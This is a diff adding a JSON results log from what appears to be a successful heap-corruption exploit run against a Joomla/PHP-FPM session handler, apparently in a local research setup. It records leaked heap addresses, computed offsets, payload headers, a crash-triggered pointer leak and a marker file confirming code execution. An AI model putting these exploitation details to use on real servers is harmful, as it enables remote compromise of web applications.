@@ -1,0 +1,376 @@
+{
+ "label": "j2",
+ "master": 174553,
+ "started": 1792627937.1094363,
+ "randomize_va_space": "2",
+ "total": 98304,
+ "used": -6149,
+ "worker0": 178035,
+ "gdb_armed": true,
+ "plant": {
+  "status": 200,
+  "head": "<br />\n<b>Fatal error</b>:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 20480 bytes) in <b>/tmp/opencode/joomla5/exploit/sess.php</b> on line <b>2</b><br />\n<br />\n<b>Warning</b>",
+  "req": 1
+ },
+ "worker_after_plant": 178035,
+ "plant_req": {
+  "heap": 139667070517312,
+  "decodes": [
+   [
+    139667071123456,
+    64946
+   ]
+  ],
+  "tmps": [
+   {
+    "P": 139667071045632,
+    "last": 0,
+    "used": 0,
+    "next": 0
+   }
+  ],
+  "rets": [
+   {
+    "slot": 139667071107088,
+    "dtor": 139667071107072,
+    "off": 16,
+    "used_now": 1
+   }
+  ],
+  "bails": [
+   [
+    139667071045632,
+    1
+   ],
+   [
+    139667071045632,
+    1
+   ],
+   [
+    139667071045632,
+    1
+   ]
+  ],
+  "shutdown": {
+   "P": 139667071045632,
+   "last": 139667071107072,
+   "first": 139667071107072,
+   "used": 1,
+   "next": 0,
+   "level": 1
+  }
+ },
+ "P_plant": 139667071045632,
+ "B0_plant": 139667071107072,
+ "heap": 139667070517312,
+ "leak_geo": {
+  "total": 98304,
+  "L": 98240,
+  "boff": 62,
+  "base": 139667070955544,
+  "P": 139667071045632,
+  "X": 139667070955520,
+  "D": 139667071045760,
+  "used": -6149
+ },
+ "leak_seed": {
+  "path": "/tmp/opencode/joomla5/tmp/sess_tb1",
+  "len": 98304,
+  "sha1": "4effc1c15dd0d5fface8ef1511644f5ce03c1b0e"
+ },
+ "leak_trigger": {
+  "status": 502,
+  "head": "<html>\r\n<head><title>502 Bad Gateway</title></head>\r\n<body>\r\n<center><h1>502 Bad Gateway</h1></center>\r\n<hr><center>nginx/1.30.1</center>\r\n</body>\r\n</html>\r\n",
+  "req": 2
+ },
+ "worker_after_leak_trigger": 178847,
+ "leak_trigger_req": {
+  "heap": 139667070517312,
+  "decodes": [
+   [
+    139667070955520,
+    98304
+   ],
+   [
+    139667071057920,
+    102666
+   ]
+  ],
+  "tmps": [
+   {
+    "P": 139667071045632,
+    "last": 139667071045760,
+    "used": -6149,
+    "next": 0
+   },
+   {
+    "P": 139667071045632,
+    "last": 139667071045760,
+    "used": -6148,
+    "next": 0
+   },
+   {
+    "P": 139667071045632,
+    "last": 139667071045760,
+    "used": -6147,
+    "next": 0
+   },
+   {
+    "P": 139667071045632,
+    "last": 139667071045760,
+    "used": -6146,
+    "next": 0
+   },
+   {
+    "P": 139667071045632,
+    "last": 139667071045760,
+    "used": -6145,
+    "next": 0
+   },
+   {
+    "P": 139667071045632,
+    "last": 139667071045760,
+    "used": -6144,
+    "next": 0
+   },
+   {
+    "P": 139667071045632,
+    "last": 139667071045760,
+    "used": -6143,
+    "next": 0
+   }
+  ],
+  "rets": [
+   {
+    "slot": 139667070947392,
+    "dtor": 139667071045760,
+    "off": -98368,
+    "used_now": -6148
+   },
+   {
+    "slot": 139667070947408,
+    "dtor": 139667071045760,
+    "off": -98352,
+    "used_now": -6147
+   },
+   {
+    "slot": 139667070947424,
+    "dtor": 139667071045760,
+    "off": -98336,
+    "used_now": -6146
+   },
+   {
+    "slot": 139667070947440,
+    "dtor": 139667071045760,
+    "off": -98320,
+    "used_now": -6145
+   },
+   {
+    "slot": 139667070947456,
+    "dtor": 139667071045760,
+    "off": -98304,
+    "used_now": -6144
+   },
+   {
+    "slot": 139667070947472,
+    "dtor": 139667071045760,
+    "off": -98288,
+    "used_now": -6143
+   },
+   {
+    "slot": 139667070947488,
+    "dtor": 139667071045760,
+    "off": -98272,
+    "used_now": -6142
+   }
+  ],
+  "uvarstrs": [
+   {
+    "ptr": 139667070947392,
+    "rc": 3324416064,
+    "len": 32
+   },
+   {
+    "ptr": 139667071057920,
+    "rc": 1,
+    "len": 98240
+   },
+   {
+    "ptr": 139667070955520,
+    "rc": 1,
+    "len": 4096
+   },
+   {
+    "ptr": 139667071164416,
+    "rc": 1,
+    "len": 98240
+   }
+  ],
+  "write": {
+   "val": 139667071156224,
+   "len": 102666,
+   "head": "537c733a343039363a220000000000000000004028c6067f00000000000000000000535353535353535300e10471b1c7211c010000000700000008000000feff"
+  }
+ },
+ "X_measured": 139667070955520,
+ "S_dest_measured": 139667070947392,
+ "first_slot": 139667070947392,
+ "PS_WRITE": {
+  "val": 139667071156224,
+  "len": 102666,
+  "head": "537c733a343039363a220000000000000000004028c6067f00000000000000000000535353535353535300e10471b1c7211c010000000700000008000000feff"
+ },
+ "bails": [],
+ "worker_after_leak_respawn": 178847,
+ "leak_get": {
+  "status": 200,
+  "len": 102666,
+  "attempt": 1
+ },
+ "leak_len": 102666,
+ "leak_sha1": "d41c2665672a322950548b94df950573d172ad80",
+ "leak": {
+  "K_dest": 139667071057920,
+  "S_len_field": 4096,
+  "S_data_len": 102656,
+  "S_prefix": "S|s:4096:\"",
+  "ptr_candidates": 63,
+  "first_ptrs": [
+   [
+    8,
+    139667071057920
+   ],
+   [
+    104,
+    139667070947584
+   ],
+   [
+    168,
+    139667070947648
+   ],
+   [
+    232,
+    139667070947712
+   ],
+   [
+    296,
+    139667070947776
+   ],
+   [
+    360,
+    139667070947840
+   ],
+   [
+    424,
+    139667070947904
+   ],
+   [
+    488,
+    139667070947968
+   ],
+   [
+    552,
+    139667070948032
+   ],
+   [
+    616,
+    139667070948096
+   ],
+   [
+    680,
+    139667070948160
+   ],
+   [
+    744,
+    139667070948224
+   ],
+   [
+    808,
+    139667070948288
+   ],
+   [
+    872,
+    139667070948352
+   ],
+   [
+    936,
+    139667070948416
+   ],
+   [
+    1000,
+    139667070948480
+   ]
+  ]
+ },
+ "K_dest": 139667071057920,
+ "offsets": {
+  "K-P": 12288,
+  "K-B0": -49152,
+  "B0-K": 49152,
+  "K-X": 102400,
+  "K-S_dest": 110528,
+  "P-K": -12288,
+  "X-K": -102400,
+  "S_dest-K": -110528
+ },
+ "formula_check": {
+  "P_minus_K": -12288,
+  "X_minus_K": -102400,
+  "S_dest_minus_K": -110528,
+  "B0_minus_K": 49152,
+  "P_minus_X": 90112
+ },
+ "worker_before_final": 178847,
+ "final_geo": {
+  "p_off": 90088,
+  "d_off": 90224,
+  "K": -8729189661629,
+  "F": 139667071058456,
+  "name_len": 98292,
+  "S": 139667071057944,
+  "P": 139667071045632,
+  "X": 139667070955520,
+  "cmd_len": 76,
+  "D": 139667071045768
+ },
+ "final_seed": {
+  "path": "/tmp/opencode/joomla5/tmp/sess_tb1",
+  "len": 98304,
+  "sha1": "e885132b9d470bc5a3d182f760b6b0514e46502b"
+ },
+ "final_plant_seed": {
+  "path": "/tmp/opencode/joomla5/tmp/sess_pl1",
+  "len": 64946,
+  "sha1": "98a78b4ac579ac102ea712e7bcd0b7c7a60014bc"
+ },
+ "marker_path": "/tmp/opencode/research/joomla_fpm_20261022T021000Z/MARKER_PASSTHRU_j2",
+ "marker_before": false,
+ "final_plant": {
+  "status": 200,
+  "head": "<br />\n<b>Fatal error</b>:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 20480 bytes) in <b>/tmp/opencode/joomla5/exploit/sess.php</b> on line <b>2</b><br />\n<br />\n<b>Warning</b>"
+ },
+ "worker_after_final_plant": 178847,
+ "final_trigger": {
+  "status": 200,
+  "head": "trigger-ok\n"
+ },
+ "marker_after": true,
+ "marker": {
+  "size": 0,
+  "mtime_ns": 1792627939892975610
+ },
+ "worker_after_final_trigger": 178847,
+ "health": {
+  "status": 200,
+  "head": "health-ok\n"
+ },
+ "worker_after_health": 178847,
+ "final_file": {
+  "len": 327,
+  "sha1": "6bcbfacee94307c9b4a7662ddc60c186d0bb1b2e",
+  "head": "787c613a353a7b733a31303a2273746172745f74696d65223b693a313739323632373933393b733a31343a22636f6e74656e745f6c656e677468223b693a3232"
+ },
+ "survived": true,
+ "success": true,
+ "finished": 1792627941.0121922
+}
